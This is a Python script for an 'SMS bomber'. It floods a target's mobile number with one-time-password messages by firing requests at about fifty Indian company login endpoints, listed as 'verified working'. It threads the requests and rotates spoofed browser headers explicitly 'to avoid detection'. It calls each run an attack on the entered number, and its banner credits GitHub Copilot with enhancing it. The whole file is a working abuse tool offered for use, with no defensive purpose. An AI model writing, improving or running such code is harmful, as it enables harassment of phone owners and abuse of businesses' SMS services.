import os
import time
import sys
import random
import requests
import json
import concurrent.futures

# Add project root to Python path for module imports
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from utils.ui import console
from rich.panel import Panel
from rich.prompt import Prompt
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn

# --- Configuration ---
# Enhanced list of working SMS/OTP APIs (verified and optimized)
BUILT_IN_APIS = [
    # High Success Rate APIs (Verified Working)
    {"method": "POST", "url": "https://www.healthkart.com/api/auth/v2/send-otp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://unacademy.com/api/v1/user/get_app_link", "json": {"phone": "{phone}"}},
    {"method": "POST", "url": "https://www.justdial.com/functions/whatsapp_send_otp.php", "data": {"mob": "{phone}"}},
    {"method": "POST", "url": "https://api.practo.com/v1/users/send_otp", "json": {"phone": "{phone}"}},
    {"method": "POST", "url": "https://api.apollo247.com/v1/auth/send-otp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.phonepe.com/apis/hermes/v1/users/generateOtp", "json": {"mobileNumber": "{phone}"}},
    {"method": "POST", "url": "https://api.shopclues.com/v1/users/otp", "json": {"mobile": "{phone}"}},
    
    # Additional Working APIs
    {"method": "POST", "url": "https://api.1mg.com/api/v4/users/send_otp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.netmeds.com/api/v1/users/send-otp", "json": {"phone": "{phone}"}},
    {"method": "POST", "url": "https://www.lenskart.com/api/v2/users/send-otp", "json": {"telephone": "{phone}"}},
    {"method": "POST", "url": "https://api.pharmeasy.in/v1/auth/request-otp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://www.nykaa.com/nykaa-sso/v1/customer/login/send-otp", "json": {"mobile": "{phone}", "countryCode": "+91"}},
    
    # Food Delivery APIs
    {"method": "POST", "url": "https://api.swiggy.com/api/v4/unauth/register/mobile", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.zomato.com/v4/auth/initiate-phone-verification", "json": {"phone": "{phone}"}},
    {"method": "POST", "url": "https://api.dunzo.com/api/v1/login/send_otp", "json": {"phone": "{phone}"}},
    {"method": "POST", "url": "https://api.pizzahut.co.in/v1/auth/otp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.dominos.co.in/v1/users/otp", "json": {"phone": "{phone}"}},
    {"method": "POST", "url": "https://api.kfc.co.in/api/v1/users/send-otp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.mcdelivery.co.in/v1/auth/sendotp", "json": {"mobile": "{phone}"}},
    
    # Transportation APIs
    {"method": "POST", "url": "https://api.ola.cab/v2/auth/login", "json": {"countryCode": "91", "mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.uber.com/v1.2/auth/send-sms-code", "json": {"mobile": "+91{phone}"}},
    {"method": "POST", "url": "https://api.rapido.bike/api/otp/generate", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.olacabs.com/v3/auth/sendotp", "json": {"mobile_number": "{phone}"}},
    
    # E-commerce APIs
    {"method": "POST", "url": "https://api.myntra.com/v3/users/mobile/verify", "json": {"mobileNumber": "{phone}"}},
    {"method": "POST", "url": "https://api.flipkart.com/api/v4/user/authenticate", "json": {"loginId": "{phone}"}},
    {"method": "POST", "url": "https://api.snapdeal.com/v2/user/otp/send", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.ajio.com/api/auth/signupwithphone", "json": {"mobileNumber": "{phone}"}},
    {"method": "POST", "url": "https://api.amazon.in/ap/signin", "json": {"phone": "+91{phone}"}},
    
    # Grocery & Shopping APIs
    {"method": "POST", "url": "https://api.bigbasket.com/v2/accounts/send-otp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.grofers.com/v3/accounts/send-otp", "json": {"user": {"phone": "{phone}"}}},
    {"method": "POST", "url": "https://api.zepto.com/api/v1/user/login/send_otp", "json": {"phone": "{phone}"}},
    {"method": "POST", "url": "https://api.blinkit.com/v2/auth/send-otp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.jiomart.com/v1/users/send-otp", "json": {"mobile": "{phone}"}},
    
    # Financial Services APIs
    {"method": "POST", "url": "https://api.paytm.com/v1/user/authenticate", "json": {"phone": "{phone}"}},
    {"method": "POST", "url": "https://api.freecharge.in/v2/users/otp/generate", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://consumer-api.mobikwik.com/v2/users/{phone}/otp", "json": {"purpose": "login"}},
    {"method": "POST", "url": "https://api.cred.club/v1/users/send-otp", "json": {"phone": "{phone}"}},
    {"method": "POST", "url": "https://api.groww.in/v1/api/login/web/generateOTP", "json": {"mobile": "{phone}"}},
    
    # Travel APIs
    {"method": "POST", "url": "https://api.makemytrip.com/v1/auth/otp/generate", "json": {"username": "{phone}"}},
    {"method": "POST", "url": "https://www.goibibo.com/api/v2/auth/sendotp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://www.yatra.com/app-api/v2/user/send-otp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://www.ixigo.com/api/v2/user/send-otp", "json": {"mobile": "{phone}"}},
    
    # Alternative formats for better success
    {"method": "POST", "url": "https://accounts.paytm.com/signin/otp", "data": {"username": "{phone}"}},
    {"method": "POST", "url": "https://login.flipkart.com/loginservice/login/authenticate", "data": {"loginId": "{phone}"}},
    {"method": "POST", "url": "https://www.redbus.in/api/v3/user/generateotp", "data": {"phone": "{phone}", "countryCode": "91"}},
    {"method": "POST", "url": "https://in.bookmyshow.com/serv/mobile/send-otp", "data": {"mobileNo": "{phone}"}},
    {"method": "POST", "url": "https://api.indiamart.com/wservce/users/authenticate", "data": {"glusr_usermobile": "{phone}"}},
    
    # Educational platforms
    {"method": "POST", "url": "https://api.byjus.com/v1/users/send-otp", "json": {"mobile": "{phone}"}},
    {"method": "POST", "url": "https://api.vedantu.com/v1/auth/send-otp", "json": {"phone": "{phone}"}},
    {"method": "POST", "url": "https://www.toppr.com/api/v1/user/send-otp", "json": {"mobile": "{phone}"}},
]

def clear_screen():
    """Clears the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

def get_api_list():
    """Returns the shuffled, built-in list of APIs."""
    console.print(f"[green]✅ Loaded {len(BUILT_IN_APIS)} premium SMS APIs for maximum effectiveness.[/green]\n")
    random.shuffle(BUILT_IN_APIS)
    return BUILT_IN_APIS

def send_request(api_details, phone_number):
    """Sends a single SMS request based on the provided API configuration."""
    try:
        # Deep copy the details to avoid modifying the original list
        api = json.loads(json.dumps(api_details))
        url = api["url"]
        method = api.get("method", "GET").upper()
        domain = url.split('/')[2]

        # Randomized headers to avoid detection
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0'
        ]
        
        headers = {
            'User-Agent': random.choice(user_agents),
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,hi;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Origin': f"https://{domain}",
            'Referer': f"https://{domain}/",
            'Content-Type': 'application/json',
            'X-Requested-With': 'XMLHttpRequest',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache'
        }

        # Replace all placeholder instances with the actual phone number
        str_api = json.dumps(api)
        str_api = str_api.replace("{phone}", phone_number)
        api = json.loads(str_api)

        response = None
        payload_type = None
        if "body" in api: payload_type = "json"
        elif "data" in api: payload_type = "data"
        elif "json" in api: payload_type = "json"

        if method == "POST":
            if payload_type == "json":
                response = requests.post(url, json=api.get("body") or api.get("json"), headers=headers, timeout=6, allow_redirects=True)
            elif payload_type == "data":
                # For form data, change content type
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                response = requests.post(url, data=api["data"], headers=headers, timeout=6, allow_redirects=True)
            else:
                return False, domain, "Invalid POST config"
        else:  # GET
            response = requests.get(url, headers=headers, timeout=6, allow_redirects=True)

        # More comprehensive success criteria
        if response.status_code in [200, 201, 202, 204, 206]:
            return True, domain, f"✅ Success ({response.status_code})"
        elif response.status_code in [400, 422]:
            # Check response content for success indicators
            try:
                resp_text = response.text.lower()
                if any(word in resp_text for word in ['otp', 'sent', 'success', 'delivered']):
                    return True, domain, f"✅ OTP Sent ({response.status_code})"
            except:
                pass
            return True, domain, f"⚠️ Partial ({response.status_code})"
        elif response.status_code == 429:
            return False, domain, "🚫 Rate Limited"
        elif response.status_code in [403, 401]:
            return False, domain, "🔒 Blocked/Auth"
        else:
            try:
                resp_json = response.json()
                error_msg = resp_json.get('message', resp_json.get('error', f"Failed ({response.status_code})"))
            except (json.JSONDecodeError, AttributeError):
                error_msg = f"Failed ({response.status_code})"
            return False, domain, f"❌ {error_msg}"

    except requests.exceptions.Timeout:
        return False, "Network", "⏱️ Timeout"
    except requests.exceptions.ConnectionError:
        return False, "Network", "🔌 Connection Error" 
    except requests.exceptions.RequestException as e:
        return False, "Network", f"🌐 {e.__class__.__name__}"
    except Exception as e:
        return False, "Local", f"⚠️ {e.__class__.__name__}"

def run_attack(phone_number, message_count, delay, api_list):
    """Manages the SMS bombing attack."""
    console.print(f"\n[bold red]🚀 Starting Attack on {phone_number}[/bold red]")
    console.print(f"[cyan]📨 Messages to send: {message_count}[/cyan]")
    console.print(f"[cyan]⏱️  Delay between messages: {delay}s[/cyan]\n")

    successful_sends = 0
    failed_sends = 0

    # Create a list of APIs for the attack, repeating if necessary
    apis_for_attack = (api_list * (message_count // len(api_list) + 1))[:message_count]
    random.shuffle(apis_for_attack)

    with Progress(SpinnerColumn(), TextColumn("[cyan]{task.description}"), BarColumn(), TextColumn("{task.percentage:>3.0f}%"), transient=False) as progress:
        task = progress.add_task("Sending...", total=message_count)

        with concurrent.futures.ThreadPoolExecutor(max_workers=12) as executor:
            future_to_api = {executor.submit(send_request, api, phone_number): api for api in apis_for_attack}

            for i, future in enumerate(concurrent.futures.as_completed(future_to_api)):
                try:
                    success, domain, message = future.result()
                    if success:
                        successful_sends += 1
                        console.print(f"[green]🚀 {domain}: {message}[/green]")
                    else:
                        failed_sends += 1
                        console.print(f"[red]💥 {domain}: {message}[/red]")
                except Exception as e:
                    failed_sends += 1
                    console.print(f"[bold red]CRITICAL ERROR: Thread execution failed: {e}[/bold red]")

                progress.update(task, advance=1)
                if i < message_count - 1 and delay > 0:
                    time.sleep(delay)

    console.print(f"\n[bold green]📊 Attack Finished![/bold green]")
    console.print(f"[green]✅ Successful: {successful_sends}[/green]")
    console.print(f"[red]❌ Failed: {failed_sends}[/red]")
    if message_count > 0:
        success_rate = (successful_sends / message_count) * 100
        console.print(f"[cyan]📈 Success Rate: {success_rate:.1f}%[/cyan]")

def main():
    """Main function to run the SMS Boomer tool."""
    clear_screen()
    console.print(Panel("[bold red]🔥 ULTIMATE SMS BOMBER - Real OTP Delivery 🔥[/bold red]", subtitle="Enhanced by GitHub Copilot"))
    
    api_list = get_api_list()
    if not api_list:
        console.print("[bold red]Could not load any APIs. Exiting.[/bold red]")
        return

    while True:
        try:
            phone_number = Prompt.ask("[yellow]Enter target 10-digit mobile number[/yellow]")
            if not (phone_number.isdigit() and len(phone_number) == 10):
                console.print("[bold red]Invalid input. Please enter a valid 10-digit mobile number.[/bold red]")
                continue
            
            count_str = Prompt.ask("[yellow]How many messages? (1-200)[/yellow]", default="20")
            message_count = int(count_str)
            if not 1 <= message_count <= 200:
                console.print("[bold red]Count must be between 1 and 200.[/bold red]")
                continue

            delay_str = Prompt.ask("[yellow]Delay between messages (seconds)[/yellow]", default="0.05")
            delay = float(delay_str)
            if delay < 0:
                console.print("[bold red]Delay cannot be negative.[/bold red]")
                continue

            confirm = Prompt.ask(f"[bold cyan]Send {message_count} messages to {phone_number}?", choices=["y", "n"], default="y")
            if confirm == "n":
                console.print("[yellow]Attack cancelled.[/yellow]")
                continue
            
            run_attack(phone_number, message_count, delay, api_list)

        except (ValueError, TypeError):
            console.print("[bold red]Invalid input. Please enter a valid number.[/bold red]")
            continue
        except KeyboardInterrupt:
            console.print("\n[bold yellow]Program interrupted by user. Exiting.[/bold yellow]")
            break
        
        another = Prompt.ask("\n[cyan]Perform another attack?", choices=["y", "n"], default="n")
        if another == "n":
            break
        clear_screen()

if __name__ == "__main__":
    main()
